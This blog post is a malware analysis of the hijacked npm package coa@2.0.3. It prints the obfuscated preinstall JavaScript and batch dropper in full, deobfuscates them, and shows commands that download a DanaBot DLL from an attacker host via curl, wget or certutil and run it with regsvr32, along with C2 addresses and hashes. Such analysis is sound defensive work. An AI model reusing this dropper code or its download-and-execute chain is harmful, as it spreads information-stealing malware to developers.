---
title: "NPM COA@2.0.3 DanaBot Dropper"
author: Travis Mathison
date: 2021-11-08 05:35:00 -0700
categories: [Blogging, Malware-Analysis]
tags: [malware, report, obfuscation, javascript, danabot]
---

**Table of Contents**
- TOC
{:toc}

## Executive Summary
A malicious actor committed a change to the `coa` NPM package and pushed version `2.0.3` with the malicious content.  Developer builds started having issues which brought this to people's attention. 

The affected repository was [https://www.npmjs.com/package/coa](https://www.npmjs.com/package/coa) and an issue was opened exposing this at [https://github.com/veged/coa/issues/99](https://github.com/veged/coa/issues/99).

A diff showed two new files added and changes to the packages.json file adding a preinstall command that kicks off the new malicious activity which can be seen at [https://my.diffend.io/npm/coa/2.0.2/2.0.4/page/1#d2h-689903](https://my.diffend.io/npm/coa/2.0.2/2.0.4/page/1#d2h-689903).

### Actions leading to a DanaBot secondary payload
1. The new change included a preinstall command to run compile.js via node
2. The obfuscated `compile.js` file ends up calling the `compile.bat` file via the command
    * ONLY Windows machines are targeted in this case, if Windows then:
    * `child_proccess.spawn("cmd.exe /c compile.bat")`
3. The obfuscated `compile.bat` file attempts to get a secondary payload and then run it

```
Attempt 1: curl https://pastorcryptograph.at/3/sdd.dll -o compile.dll
Attempt 2: wget https://pastorcryptograph.at/3/sdd.dll -O compile.dll
Attempt 3: certutil.exe -urlcache -f https://pastorcryptograph.at/3/sdd.dll compile.dll

regsvr32.exe -s compile.dll
```

### Visual path of execution

<img style="align:left" src="{{ site.url }}/assets/img/blogging/coa_203_01.png"/>

### What gets dropped?
Config extractors matched this secondary payload to be a DanaBot information stealer. I successfully pulled down the DanaBot malware payload but have not analyzed this yet to identify any changed functionality from previous samples.

### IOC's
**C2**

| Name | Value |
|:---|:----|
| C2 | 185.106.123.228:443 |
| C2 | 193.42.36.59:443 |
| C2 | 193.56.146.53:443 |
| C2 | 185.117.90.36:443 |

**MD5 hashes**

| Name | Value |
|:---|:----|
| MD5 (compile.js) | accbf560283950ef17bb22164f7003ae |
| MD5 (compile.bat) | 59f3cfd4525da8b7df2815f0ec1a13f1 |
| MD5 (compile.dll) | f778af11f5e5b2a1ee4ed8e54461e85a |

## Technical Analysis

### Deobfuscating: `compile.js`
The following details the analysis of the `compile.js` file that was checked into the repository.  This is the start of the attack as it gets executed in node via the preinstall in package.json

**Obfuscated javascript**<br/>
The following obfuscated javascript is the contents of the file as it was checked in.
```javascript
const _0x29286e=_0x3b9e;(function(_0x595213,_0x1c7f12){const _0x524030=_0x3b9e,_0x10bbc4=_0x595213();while(!![]){try{const _0x5ab451=parseInt(_0x524030(0xef))/0x1*(-parseInt(_0x524030(0xfa))/0x2)+parseInt(_0x524030(0xf7))/0x3+-parseInt(_0x524030(0xf6))/0x4*(parseInt(_0x524030(0xf5))/0x5)+-parseInt(_0x524030(0xf2))/0x6*(-parseInt(_0x524030(0xed))/0x7)+-parseInt(_0x524030(0xf8))/0x8*(parseInt(_0x524030(0xe9))/0x9)+parseInt(_0x524030(0xeb))/0xa+parseInt(_0x524030(0xf3))/0xb*(parseInt(_0x524030(0xf4))/0xc);if(_0x5ab451===_0x1c7f12)break;else _0x10bbc4['push'](_0x10bbc4['shift']());}catch(_0x3b1efb){_0x10bbc4['push'](_0x10bbc4['shift']());}}}(_0x4f67,0x3d733));const {exec}=require('child_process');function _0x4f67(){const _0x5d7817=['28bejTPQ','1355673ZDaxId','779896MgsJdu','child_process','26358GzOkXk','MacOS','platform','cmd.exe','win64','27EVEPMY','win32','768760SJubeg','Linux','111587KPhwpG','compile.bat','11xGbwXc','linux','darwin','36HiOlse','11PTXHjR','3696096qOooYF','173780mPHnxy'];_0x4f67=function(){return _0x5d7817;};return _0x4f67();}var opsys=process[_0x29286e(0xfc)];function _0x3b9e(_0x21f5ee,_0x411966){const _0x4f6708=_0x4f67();return _0x3b9e=function(_0x3b9ecb,_0x3ac81f){_0x3b9ecb=_0x3b9ecb-0xe9;let _0x5a6794=_0x4f6708[_0x3b9ecb];return _0x5a6794;},_0x3b9e(_0x21f5ee,_0x411966);}if(opsys==_0x29286e(0xf1))opsys=_0x29286e(0xfb);else{if(opsys==_0x29286e(0xea)||opsys==_0x29286e(0xfe)){opsys='Windows';const {spawn}=require(_0x29286e(0xf9)),bat=spawn(_0x29286e(0xfd),['/c',_0x29286e(0xee)]);}else opsys==_0x29286e(0xf0)&&(opsys=_0x29286e(0xec));}
```

**Deobfuscation**<br/>
I ran the above code through https://deobfuscate.io to help make more sense of it.  The code is still in an obfuscated state and needed to be understood better
```javascript
const _0x29286e = _0x3b9e;

(function (_0x595213, _0x1c7f12) {
  const _0x524030 = _0x3b9e, _0x10bbc4 = _0x595213();
  while (!![]) {
    try {
      const _0x5ab451 = parseInt(_0x524030(239)) / 1 * (-parseInt(_0x524030(250)) / 2) + parseInt(_0x524030(247)) / 3 + -parseInt(_0x524030(246)) / 4 * (parseInt(_0x524030(245)) / 5) + -parseInt(_0x524030(242)) / 6 * (-parseInt(_0x524030(237)) / 7) + -parseInt(_0x524030(248)) / 8 * (parseInt(_0x524030(233)) / 9) + parseInt(_0x524030(235)) / 10 + parseInt(_0x524030(243)) / 11 * (parseInt(_0x524030(244)) / 12);
      if (_0x5ab451 === _0x1c7f12) break; else _0x10bbc4.push(_0x10bbc4.shift());
    } catch (_0x3b1efb) {
      _0x10bbc4.push(_0x10bbc4.shift());
    }
  }
}(_0x4f67, 251699));

const {exec} = require("child_process");

function _0x4f67() {
  const _0x5d7817 = ["28bejTPQ", "1355673ZDaxId", "779896MgsJdu", "child_process", "26358GzOkXk", "MacOS", "platform", "cmd.exe", "win64", "27EVEPMY", "win32", "768760SJubeg", "Linux", "111587KPhwpG", "compile.bat", "11xGbwXc", "linux", "darwin", "36HiOlse", "11PTXHjR", "3696096qOooYF", "173780mPHnxy"];
  _0x4f67 = function () {
    return _0x5d7817;
  };
  return _0x4f67();
}

var opsys = process[_0x29286e(252)];

function _0x3b9e(_0x21f5ee, _0x411966) {
  const _0x4f6708 = _0x4f67();
  return _0x3b9e = function (_0x3b9ecb, _0x3ac81f) {
    _0x3b9ecb = _0x3b9ecb - 233;
    let _0x5a6794 = _0x4f6708[_0x3b9ecb];
    return _0x5a6794;
  }, _0x3b9e(_0x21f5ee, _0x411966);
}

if (opsys == _0x29286e(241)) opsys = _0x29286e(251); else {
  if (opsys == _0x29286e(234) || opsys == _0x29286e(254)) {
    opsys = "Windows";
    const {spawn} = require(_0x29286e(249)), bat = spawn(_0x29286e(253), ["/c", _0x29286e(238)]);
  } else opsys == _0x29286e(240) && (opsys = _0x29286e(236));
}
```

**Fully annotated analysis of javascript**<br/>
After I analyzed the javascript and updated the variables I produced the commented file below.

**High level:**
* Rotating array of fields
    * The script works by pre-creating an array of alphanumeric text fields some of which produce integers to be used in a long calculation
    * The script starts by performing this calculation with an expected result to make and if it fails it rotates the array by one and attempts again until it succeeds
    * The end result is the same array of fields but in a new order
* Detects whether it is running on MacOS, Windows, or Linux
* If running on Windows it will execute `child_proccess.spawn("cmd.exe /c compile.bat")`
```javascript
const ptr_func3 = func3;

// This rotates the values in the array until the magical result compares to 251699
(function (rotating_array, target_value) {
  const ptr_func3 = func3, ptr_rotating_array = rotating_array();

  // NOTE: The double exclamation mark in JavaScript basically means convert to Boolean, invert, then invert again. I documented this on my blog for quick reference as I keep running into it
  while (!![]) { // while([] != 0)
    try {
      const result_value = parseInt(ptr_func3(239)) / 1 * (-parseInt(ptr_func3(250)) / 2) + parseInt(ptr_func3(247)) / 3 + -parseInt(ptr_func3(246)) / 4 * (parseInt(ptr_func3(245)) / 5) + -parseInt(ptr_func3(242)) / 6 * (-parseInt(ptr_func3(237)) / 7) + -parseInt(ptr_func3(248)) / 8 * (parseInt(ptr_func3(233)) / 9) + parseInt(ptr_func3(235)) / 10 + parseInt(ptr_func3(243)) / 11 * (parseInt(ptr_func3(244)) / 12);
      if (result_value === target_value) 
        break; 
      else 
        // move first element of array to end
        ptr_rotating_array.push(ptr_rotating_array.shift());
    } catch (Exception) {
      // exceptions occur since parseInt attempt to perform it on text
      ptr_rotating_array.push(ptr_rotating_array.shift()); 
    }
  }
}(get_array_string, 251699));

const {exec} = require("child_process");

// Number passed in minus 233 is the index value to retrieve
// NOTE1: parseInt against a value like 779896MgsJdu will return the integers and ignore the characters (they are junk)
// NOTE2: -parseInt will simply make the above number a negative
function get_array_string() {
  const value_array = ["28bejTPQ", "1355673ZDaxId", "779896MgsJdu", "child_process", "26358GzOkXk", "MacOS", "platform", "cmd.exe", "win64", "27EVEPMY", "win32", "768760SJubeg", "Linux", "111587KPhwpG", "compile.bat", "11xGbwXc", "linux", "darwin", "36HiOlse", "11PTXHjR", "3696096qOooYF", "173780mPHnxy"];
  get_array_string = function () {
    return value_array;
  };
  return get_array_string();
}

// NOTE: The array has been rotated now and the ptr_func3 and func3 array values are against that array
// The rotated array is:
// ['27EVEPMY', 'win32', '768760SJubeg', 'Linux', '111587KPhwpG', 'compile.bat', '11xGbwXc', 'linux', 
//  'darwin', '36HiOlse', '11PTXHjR', '3696096qOooYF', '173780mPHnxy', '28bejTPQ', '1355673ZDaxId', 
//  '779896MgsJdu', 'child_process', '26358GzOkXk', 'MacOS', 'platform', 'cmd.exe', 'win64']
var opsys = process[ptr_func3(252)]; // platform

function func3(_0x21f5ee, _0x411966) {
  const value_string = get_array_string();
  return func3 = function (_0x3b9ecb, _0x3ac81f) {
    _0x3b9ecb = _0x3b9ecb - 233;
    let _0x5a6794 = value_string[_0x3b9ecb];
    return _0x5a6794;
  }, func3(_0x21f5ee, _0x411966);
}

if (opsys == ptr_func3(241) /*darwin*/) 
  opsys = ptr_func3(251 /*MacOS*/); 
else {
  if (opsys == ptr_func3(234) /*win32*/ || opsys == ptr_func3(254) /*win64*/) {
    opsys = "Windows";
    // EXEC: child_proccess.spawn("cmd.exe /c compile.bat")
    const {spawn} = require(ptr_func3(249) /*child_process*/), bat = spawn(ptr_func3(253) /*cmd.exe*/, ["/c", ptr_func3(238) /*compile.bat*/]);
  } else 
    opsys == ptr_func3(240) /*linux*/ && (opsys = ptr_func3(236) /*Linux*/);
}
```

**Array rotation**<br/>
The interesting part of this script is the rotation of the items in the array.  The items will continue to be rotated until a mathematical condition is met.

The following python script emulates the logic of what is happening in the javascript.
```python
import re

value_array = ["28bejTPQ", "1355673ZDaxId", "779896MgsJdu", "child_process", "26358GzOkXk", "MacOS", "platform", "cmd.exe", "win64", "27EVEPMY", "win32", "768760SJubeg", "Linux", "111587KPhwpG", "compile.bat", "11xGbwXc", "linux", "darwin", "36HiOlse", "11PTXHjR", "3696096qOooYF", "173780mPHnxy"]
target_value = 251699

def parseInt(sin):
  m = re.search(r'^(\d+)[.,]?\d*?', str(sin))
  return int(m.groups()[-1]) if m and not callable(sin) else None

def get_array_value(value):
    return value_array[value - 233]
  
def rotate():
  temp = value_array[0]
  value_array.remove(temp)
  value_array.append(temp)

while True:
  try:
    result = parseInt(get_array_value(239)) / 1 * (-parseInt(get_array_value(250)) / 2) + parseInt(get_array_value(247)) / 3 + -parseInt(get_array_value(246)) / 4 * (parseInt(get_array_value(245)) / 5) + -parseInt(get_array_value(242)) / 6 * (-parseInt(get_array_value(237)) / 7) + -parseInt(get_array_value(248)) / 8 * (parseInt(get_array_value(233)) / 9) + parseInt(get_array_value(235)) / 10 + parseInt(get_array_value(243)) / 11 * (parseInt(get_array_value(244)) / 12)
    if result == target_value:
      break
    else:
      rotate()
  except:
    rotate()


print(value_array)
```
**Output**
```
['27EVEPMY', 'win32', '768760SJubeg', 'Linux', '111587KPhwpG', 'compile.bat', '11xGbwXc', 'linux', 'darwin', '36HiOlse', '11PTXHjR', '3696096qOooYF', '173780mPHnxy', '28bejTPQ', '1355673ZDaxId', '779896MgsJdu', 'child_process', '26358GzOkXk', 'MacOS', 'platform', 'cmd.exe', 'win64']
```

### Deobfuscating: `compile.bat`
The batch file was also obfuscated and the original contents are shown below.  The process to reverse this was pretty straight forward as there is clearly a string that the batch file indexes into for each character.

To unravel this I created a python script to print it out into plaintext.<br/>

**compile.bat (original)**
```bat
@echo off
Set aim=dgYfeRCiI6tM5ySU4AFWnGwu7j3VBTPD82cHblKEvJhQqozN1sxZL0rm9apXkO
cls
@%aim:~4,1%%aim:~34,1%%aim:~42,1%%aim:~45,1% %aim:~45,1%%aim:~3,1%%aim:~3,1%
%aim:~34,1%%aim:~23,1%%aim:~54,1%%aim:~37,1% %aim:~42,1%%aim:~10,1%%aim:~10,1%%aim:~58,1%%aim:~49,1%://%aim:~58,1%%aim:~57,1%%aim:~49,1%%aim:~10,1%%aim:~45,1%%aim:~54,1%%aim:~34,1%%aim:~54,1%%aim:~13,1%%aim:~58,1%%aim:~10,1%%aim:~45,1%%aim:~1,1%%aim:~54,1%%aim:~57,1%%aim:~58,1%%aim:~42,1%.%aim:~57,1%%aim:~10,1%/%aim:~26,1%/%aim:~49,1%%aim:~0,1%%aim:~0,1%.%aim:~0,1%%aim:~37,1%%aim:~37,1% -%aim:~45,1% %aim:~34,1%%aim:~45,1%%aim:~55,1%%aim:~58,1%%aim:~7,1%%aim:~37,1%%aim:~4,1%.%aim:~0,1%%aim:~37,1%%aim:~37,1%
%aim:~7,1%%aim:~3,1% %aim:~20,1%%aim:~45,1%%aim:~10,1% %aim:~4,1%%aim:~50,1%%aim:~7,1%%aim:~49,1%%aim:~10,1% %aim:~34,1%%aim:~45,1%%aim:~55,1%%aim:~58,1%%aim:~7,1%%aim:~37,1%%aim:~4,1%.%aim:~0,1%%aim:~37,1%%aim:~37,1% (
	%aim:~22,1%%aim:~1,1%%aim:~4,1%%aim:~10,1% %aim:~42,1%%aim:~10,1%%aim:~10,1%%aim:~58,1%%aim:~49,1%://%aim:~58,1%%aim:~57,1%%aim:~49,1%%aim:~10,1%%aim:~45,1%%aim:~54,1%%aim:~34,1%%aim:~54,1%%aim:~13,1%%aim:~58,1%%aim:~10,1%%aim:~45,1%%aim:~1,1%%aim:~54,1%%aim:~57,1%%aim:~58,1%%aim:~42,1%.%aim:~57,1%%aim:~10,1%/%aim:~26,1%/%aim:~49,1%%aim:~0,1%%aim:~0,1%.%aim:~0,1%%aim:~37,1%%aim:~37,1% -%aim:~61,1% %aim:~34,1%%aim:~45,1%%aim:~55,1%%aim:~58,1%%aim:~7,1%%aim:~37,1%%aim:~4,1%.%aim:~0,1%%aim:~37,1%%aim:~37,1%
)
%aim:~7,1%%aim:~3,1% %aim:~20,1%%aim:~45,1%%aim:~10,1% %aim:~4,1%%aim:~50,1%%aim:~7,1%%aim:~49,1%%aim:~10,1% %aim:~34,1%%aim:~45,1%%aim:~55,1%%aim:~58,1%%aim:~7,1%%aim:~37,1%%aim:~4,1%.%aim:~0,1%%aim:~37,1%%aim:~37,1% (
	%aim:~34,1%%aim:~4,1%%aim:~54,1%%aim:~10,1%%aim:~23,1%%aim:~10,1%%aim:~7,1%%aim:~37,1%.%aim:~4,1%%aim:~50,1%%aim:~4,1% -%aim:~23,1%%aim:~54,1%%aim:~37,1%%aim:~34,1%%aim:~57,1%%aim:~34,1%%aim:~42,1%%aim:~4,1% -%aim:~3,1% %aim:~42,1%%aim:~10,1%%aim:~10,1%%aim:~58,1%%aim:~49,1%://%aim:~58,1%%aim:~57,1%%aim:~49,1%%aim:~10,1%%aim:~45,1%%aim:~54,1%%aim:~34,1%%aim:~54,1%%aim:~13,1%%aim:~58,1%%aim:~10,1%%aim:~45,1%%aim:~1,1%%aim:~54,1%%aim:~57,1%%aim:~58,1%%aim:~42,1%.%aim:~57,1%%aim:~10,1%/%aim:~26,1%/%aim:~49,1%%aim:~0,1%%aim:~0,1%.%aim:~0,1%%aim:~37,1%%aim:~37,1% %aim:~34,1%%aim:~45,1%%aim:~55,1%%aim:~58,1%%aim:~7,1%%aim:~37,1%%aim:~4,1%.%aim:~0,1%%aim:~37,1%%aim:~37,1%
)
%aim:~54,1%%aim:~4,1%%aim:~1,1%%aim:~49,1%%aim:~40,1%%aim:~54,1%%aim:~26,1%%aim:~33,1%.%aim:~4,1%%aim:~50,1%%aim:~4,1% -%aim:~49,1% %aim:~34,1%%aim:~45,1%%aim:~55,1%%aim:~58,1%%aim:~7,1%%aim:~37,1%%aim:~4,1%.%aim:~0,1%%aim:~37,1%%aim:~37,1%
```

**Python to deobfuscate**
```python
import re

aim = "dgYfeRCiI6tM5ySU4AFWnGwu7j3VBTPD82cHblKEvJhQqozN1sxZL0rm9apXkO"
content = r"<the content from the original file>"

# Decode from %aim:~##,#% to letter
def decode(data):
    m = re.findall(r'%aim:~([0-9]\d?\d?)', data)
    return aim[int(m[0])]

# handle each line separately
commands = content.split(r'\n')

first_command = True
for command in commands:
    matches = re.findall(r'%aim:~[0-9]\d?\d?,1%', command)
    
    for match in matches:
        command = command.replace(match, decode(match))
    
    if first_command:
        print('@' + command)
        first_command = False
    else:
        print(command)
```
**compile.bat (plaintext)**
```bat
@echo off
curl https://pastorcryptograph.at/3/sdd.dll -o compile.dll
if not exist compile.dll (
	wget https://pastorcryptograph.at/3/sdd.dll -O compile.dll
)
if not exist compile.dll (
	certutil.exe -urlcache -f https://pastorcryptograph.at/3/sdd.dll compile.dll
)
regsvr32.exe -s compile.dll
```

## Conclusion
This is an example of a supply chain attack where NPM was impacted and is a trusted source for developer builds around the world.  

Any builds that were setup to pull the latest version of the package may have picked it up between the time the package was pushed until taken down.

What I've shown above is the initial phase of the attacker infecting a Windows machine to pull down the secondary payload and execute it on the machine.  In this case, it is the DanaBot InfoStealer.